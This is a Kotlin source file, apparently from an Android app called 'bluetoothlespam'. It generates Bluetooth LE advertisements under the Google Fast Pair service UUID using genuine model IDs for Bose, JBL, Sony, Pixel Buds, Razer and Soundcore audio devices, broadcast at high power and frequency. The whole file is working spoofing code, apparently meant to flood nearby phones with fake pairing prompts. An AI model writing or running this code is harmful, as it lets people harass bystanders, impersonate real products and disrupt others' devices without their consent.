package de.simon.dankelmann.bluetoothlespam.AdvertisementSetGenerators

import android.bluetooth.le.AdvertiseData
import android.bluetooth.le.AdvertisingSetParameters
import android.os.ParcelUuid
import de.simon.dankelmann.bluetoothlespam.Callbacks.GoogleFastPairAdvertisingSetCallback
import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers
import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
import java.util.UUID

class GoogleFastPairAdvertisementSetGenerator:IAdvertisementSetGenerator{

    val _genuineDeviceIds = mapOf(
        "CD8256" to "Bose NC 700",
        "F52494" to "JBL Buds Pro",
        "718FA4" to "JBL Live 300TWS",
        "821F66" to "JBL Flip 6",
        "92BBBD" to "Pixel Buds",
        "D446A7" to "Sony XM5",
        "2D7A23" to "Sony WF-1000XM4",
        "0E30C3" to "Razer Hammerhead TWS",
        "72EF8D" to "Razer Hammerhead TWS X",
        "72FB00" to "Soundcore Spirit Pro GVA"
    )

    val serviceUuid = ParcelUuid(UUID.fromString("0000fe2c-0000-1000-8000-00805f9b34fb"))

    override fun getAdvertisementSets():List<AdvertisementSet> {
        var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()

        _genuineDeviceIds.map {

            val advertisingSetParameters = AdvertisingSetParameters.Builder()
                .setLegacyMode(true)
                .setInterval(AdvertisingSetParameters.INTERVAL_HIGH)
                .setTxPowerLevel(AdvertisingSetParameters.TX_POWER_HIGH)
                .build()

            val advertiseData: AdvertiseData = AdvertiseData.Builder()
                .setIncludeDeviceName(false)
                .addServiceUuid(serviceUuid)
                .addServiceData(serviceUuid, StringHelpers.decodeHex(it.key))
                //.addManufacturerData(manufacturerId, serviceData)
                //.addManufacturerData(manufacturerId, manufacturerSpecificData)
                .setIncludeTxPowerLevel(true)
                .build()

            var advertisementSet:AdvertisementSet = AdvertisementSet()
            advertisementSet.deviceName = it.value
            advertisementSet.advertiseData = advertiseData
            advertisementSet.advertisingSetParameters = advertisingSetParameters
            advertisementSet.callback = GoogleFastPairAdvertisingSetCallback()

            advertisementSets.add(advertisementSet)
        }

        return advertisementSets.toList()
    }


}